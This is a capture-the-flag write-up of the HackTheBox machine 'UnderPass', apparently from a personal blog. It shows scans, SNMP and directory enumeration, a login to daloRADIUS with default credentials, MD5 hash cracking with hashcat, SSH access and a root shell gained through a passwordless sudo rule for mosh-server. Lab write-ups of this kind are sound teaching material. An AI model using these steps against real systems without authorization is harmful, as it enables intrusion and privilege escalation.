---
title: "HackTheBox: UnderPass" 
date: 2025-01-19 15:49:45 +0000
categories: [HackTheBox, FullPwn]
tags: [snmp, daloradius, hash_cracking, privilege_escalation, mosh-server, nmap, directory_enum, fullpwn, linux]
image:
    path: /images/hackthebox/fullpwn/underpass/room_image.png
excerpt: "Explore how I tackled the 'UnderPass' challenge on HackTheBox!"
description: "Explore how I tackled the 'UnderPass' challenge on HackTheBox!"
---


## Details
![Challenge Card](/images/hackthebox/fullpwn/underpass/info_card.png)
[**Challenge Link**](https://app.hackthebox.com/machines/UnderPass)

---

## Summary

In this challenge, I began by performing an Nmap scan on the target IP address, which revealed open `SSH` and `HTTP` ports. A subsequent `UDP` port scan identified an open SNMP port, which I enumerated to gather additional details, including the domain name. The HTTP service was running `daloRADIUS`, and directory enumeration within the `/daloradius` directory revealed `/app` directory. Further enumeration on `/app` directory exposed an endpoint for operators to log in.

Using default daloRADIUS credentials, I logged in as admin and discovered a username along with an MD5-hashed password under the management section. I cracked the hash using `hashcat`, obtained the cleartext password, and successfully logged into the system via SSH, retrieving the user flag.

For privilege escalation, I ran `sudo -l` and discovered that the user could execute `mosh-server` as root without a password. I used mosh by overwriting the default options with `--server="sudo mosh-server"`, which granted me a root shell and allowed me retrieve the root flag.

---

## 1. Nmap Scanning

### TCP Ports Scanning

To scan the ports on the machine, I have utilized Nmap. 

```shell
$ nmap -sV -sC 10.10.11.48
Nmap scan report for 10.10.11.48
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



This scan revealed that the machine has two open `TCP` ports:
- `22(SSH)`
- `80(HTTP)`

Upon visiting the `HTTP` service on port `80`, I encountered a default Apache2 Ubuntu page.

![Default Apache2 image](/images/hackthebox/fullpwn/underpass/default_apache2_page.png)

After finding nothing of interest, I decided to perform directory enumeration. However, before proceeding, I scanned the `UDP` ports to check for any additional points of interest.

### UDP Ports Scanning

I used Nmap again to scan for open UDP ports on the target machine.

```shell
$ sudo nmap -sU -F 10.10.11.48
Nmap scan report for 10.10.11.48
Host is up (0.028s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
```
>- The `sudo` command was used because UDP Port scanning requires root priviliges.
- `-sU`: Enables a UDP scan.
- `-F`: Limits the scan to the top 100 UDP ports based on Nmap's default frequency list.
{: .prompt-info }

From the `UDP` scan results, it was observed that the host is running `SNMP` service on port `161`. 
Therefore, we can do enumeration on SNMP service to gather some additional informations.

---


## 2. Enumeration

### SNMP Enumeration

To enumerate the `SNMP` service on port `161`, I used `snmp-check`.

```shell
$ snmp-check 10.10.11.48          
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 04:15:30.64
```
We can observe that the hostname is `underpass.htb`, and the `HTTP` service is identified as running `daloRADIUS`, a RADIUS management web interface. This information is crucial as it provides a domain name for further enumeration and hints at a specific application to investigate.

>Before proceeding with further enumeration, I added the hostname to the `/etc/hosts` file. This allowed me to reference the host directly by its name during directory enumeration, simplifying the process.
{: .prompt-warning }


### Directory Enumeration

I performed directory enumeration on `http://underpass.htb/daloradius/` within the web service to uncover additional directories and files of interest.

```shell
$ gobuster dir -u underpass.htb/daloradius/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://underpass.htb/daloradius/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/library              (Status: 301) [Size: 327] [--> http://underpass.htb/daloradius/library/]
/doc                  (Status: 301) [Size: 323] [--> http://underpass.htb/daloradius/doc/]
/app                  (Status: 301) [Size: 323] [--> http://underpass.htb/daloradius/app/]
/contrib              (Status: 301) [Size: 327] [--> http://underpass.htb/daloradius/contrib/]
/ChangeLog            (Status: 200) [Size: 24703]
/setup                (Status: 301) [Size: 325] [--> http://underpass.htb/daloradius/setup/]
/LICENSE              (Status: 200) [Size: 18011]
```

Having investigated the `/app/` directory, I proceeded with further enumeration within it.

```shell
$ gobuster dir -u underpass.htb/daloradius/app -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://underpass.htb/daloradius/app
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/common               (Status: 301) [Size: 330] [--> http://underpass.htb/daloradius/app/common/]
/users                (Status: 301) [Size: 329] [--> http://underpass.htb/daloradius/app/users/]
/operators            (Status: 301) [Size: 333] [--> http://underpass.htb/daloradius/app/operators/]
```

The `users/` directory seems interesting.

Upon visiting the page, we were redirected to `http://underpass.htb/daloradius/app/users/login.php` since we are not authorized yet. 
It is a page where we can log in. I tried the default credentials for daloradius: `administrator:radius` but did not work.

![Login Failed image](/images/hackthebox/fullpwn/underpass/login_fail.png)

This time, I have visited the end point `http://underpass.htb/daloradius/app/operators/` and it redirected me to `http://underpass.htb/daloradius/app/operators/login.php` prompted me to log in as `operator/admin`. Utilizing the same credentials: `administrator:radius`, we were able to log in as admin to control panel.

---


## 3. Obtaining User Credentials

Under the `Management` tab, when you list the users, we can see a user with its username and hashed password.

![User Information image](/images/hackthebox/fullpwn/underpass/user_info.png)

The hash appeared to be an MD5 hash, but to verify, I used `hash-identifier`.

```shell
$ hash-identifier                                   
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 41[REDACTED]03

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Now that we know the hash is MD5, I proceeded to crack it using `hashcat` in dictionary attack mode.

```shell
$ hashcat -m 0 -a 0 -o cracked.txt user_hash.txt /usr/share/wordlists/rockyou.txt                                  
```

>- `-m 0`:This flag tells hashcat that the hash is MD5
- `-a 0`: This flag tells hashcat that the attack mode is `Dictionary`
- `rockyou.txt` has been used to crack this hash
{: .prompt-info }

The hash is cracked and the password:
```shell
$ cat cracked.txt  
41[REDACTED]03:u[REDACTED]s
```

---


## 4. Getting User Flag

Since the host had the `SSH` port open, I attempted to log in using the credentials I found.

```shell
$ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan 19 06:46:33 PM UTC 2025

  System load:  0.3               Processes:             229
  Usage of /:   51.1% of 6.56GB   Users logged in:       1
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 19 18:15:44 2025 from 10.10.14.54
svcMosh@underpass:~$
```

```shell
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
svcMosh@underpass:~$ cat user.txt
b[.....REDACTED.....]5
```


We have sucessfully connected and got the user flag!

---

## 4. Privilege Escalation and Root Flag

After gaining user access to the system, I checked the user's sudo privileges using the command `sudo -l`

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

This revealed that the user had the ability to execute mosh-server with sudo privileges without requiring a password.

I took advantage of this by using `mosh` to initiate a remote shell to the local host. Instead of using the default `mosh localhost` command, I overrode the default execution settings and ran the following command to execute `mosh-server` with elevated privileges:

```shell
svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost
```
This allowed me to obtain a root shell. Once I had root access, I retrieved the root flag:

```shell
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan 19 07:24:37 PM UTC 2025

  System load:  0.0               Processes:             237
  Usage of /:   51.4% of 6.56GB   Users logged in:       1
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# whoami
root
root@underpass:~# cat root.txt
2[-----REDACTED-----]0
```



